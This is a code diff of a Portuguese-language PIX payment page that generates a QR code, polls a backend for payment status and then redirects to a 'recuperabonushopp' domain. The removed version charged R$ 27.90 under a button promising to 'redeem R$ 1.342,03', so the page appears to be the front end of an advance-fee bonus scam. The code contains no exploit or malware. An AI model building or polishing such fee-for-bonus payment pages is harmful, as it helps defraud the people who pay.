@@ -1,117 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento PIX</title>
+
+<style>
+body{
+  font-family: Arial, Helvetica, sans-serif;
+  background:#f5f5f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.box{
+  background:#fff;
+  padding:30px;
+  border-radius:12px;
+  text-align:center;
+  width:350px;
+  box-shadow:0 0 15px rgba(0,0,0,0.1);
+}
+
+button{
+  background:#00a650;
+  color:#fff;
+  border:none;
+  padding:15px;
+  width:100%;
+  font-size:16px;
+  border-radius:8px;
+  cursor:pointer;
+  margin-top:15px;
+}
+
+button:disabled{
+  background:gray;
+}
+
+#qrcode{
+  margin-top:20px;
+}
+
+#pixCode{
+  word-break:break-all;
+  background:#f1f1f1;
+  padding:10px;
+  border-radius:8px;
+  margin-top:10px;
+  font-size:12px;
+}
+
+#continuar{
+  display:none;
+  background:#007bff;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>Pagamento via PIX</h2>
+
+<button onclick="gerarPix()" id="gerar">
+Gerar QR Code
+</button>
+
+<div id="qrcode"></div>
+
+<div id="pixCode"></div>
+
+<button id="continuar" onclick="continuar()">
+Continuar
+</button>
+
+</div>
+
 <script>
 
-function gerarPix() {
+let transactionId = null
 
-    const btn = document.getElementById("btn_pagar");
-    btn.innerHTML = "PROCESSANDO...";
-    btn.disabled = true;
+async function gerarPix(){
 
-    fetch("https://checkout-pix-profissional.onrender.com/pix", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ valor: "27.90" })
-    })
-    .then(res => res.json())
-    .then(data => {
+  document.getElementById("gerar").disabled = true
 
-        console.log("RESPOSTA PIX:", data);
+  const res = await fetch("/pix", { method:"POST" })
+  const data = await res.json()
 
-        if (!data.success) throw new Error("Falha ao gerar PIX");
+  transactionId = data.transactionId
 
-        abrirModal(data);
+  if(data.encodedImage){
+    document.getElementById("qrcode").innerHTML =
+      `<img src="data:image/png;base64,${data.encodedImage}" width="220">`
+  }
 
-        // ✅ Só verifica se backend mandar paymentId
-        if (data.paymentId) {
-            verificarPagamento(data.paymentId, btn);
-        } else {
-            console.warn("⚠️ paymentId não veio do backend");
-            liberarBotao(btn);
-        }
+  document.getElementById("pixCode").innerText = data.payload
 
-    })
-    .catch(err => {
-        console.error("ERRO PIX:", err);
-        alert("Erro ao gerar pagamento");
-        liberarBotao(btn);
-    });
+  verificarPagamento()
 }
 
-function abrirModal(data) {
+async function verificarPagamento(){
 
-    overlay.style.display = "block";
-    modal_pix.style.display = "block";
+  const interval = setInterval(async () => {
 
-    txt_codigo.value = data.payload;
+    const res = await fetch(`/check-status/${transactionId}`)
+    const data = await res.json()
 
-    qr_code_div.innerHTML = "";
+    if(data.paid){
 
-    if (data.encodedImage) {
+      clearInterval(interval)
 
-        const src = data.encodedImage.startsWith("http")
-            ? data.encodedImage
-            : `data:image/png;base64,${data.encodedImage}`;
+      document.getElementById("qrcode").innerHTML = ""
+      document.getElementById("pixCode").innerHTML = "✅ PAGAMENTO CONFIRMADO"
 
-        qr_code_div.innerHTML = `<img src="${src}">`;
+      document.getElementById("continuar").style.display = "block"
 
-    } else {
-
-        new QRCode(qr_code_div, {
-            text: data.payload,
-            width: 200,
-            height: 200
-        });
     }
+
+  }, 3000)
+
 }
 
-function verificarPagamento(paymentId, btn) {
-
-    console.log("🔎 Verificando pagamento:", paymentId);
-
-    const intervalo = setInterval(() => {
-
-        fetch(`https://checkout-pix-profissional.onrender.com/status/${paymentId}`)
-        .then(res => res.json())
-        .then(data => {
-
-            console.log("STATUS:", data);
-
-            if (data.status === "approved" || data.status === "paid") {
-
-                clearInterval(intervalo);
-
-                fecharModal();
-                liberarBotao(btn);
-
-                alert("✅ Pagamento confirmado");
-
-            }
-
-        })
-        .catch(err => {
-            console.error("ERRO STATUS:", err);
-            clearInterval(intervalo);
-            liberarBotao(btn);
-        });
-
-    }, 3000);
-}
-
-function fecharModal() {
-    overlay.style.display = "none";
-    modal_pix.style.display = "none";
-    qr_code_div.innerHTML = "";
-    txt_codigo.value = "";
-}
-
-function liberarBotao(btn) {
-    btn.innerHTML = "RESGATAR R$ 1.342,03";
-    btn.disabled = false;
-}
-
-function copiarCodigo() {
-    txt_codigo.select();
-    navigator.clipboard.writeText(txt_codigo.value);
-    alert("Código PIX copiado!");
+function continuar(){
+  window.location.href = "https://recuperabonushopp.com/elementor-1064"
 }
 
 </script>
+
+</body>
+</html>
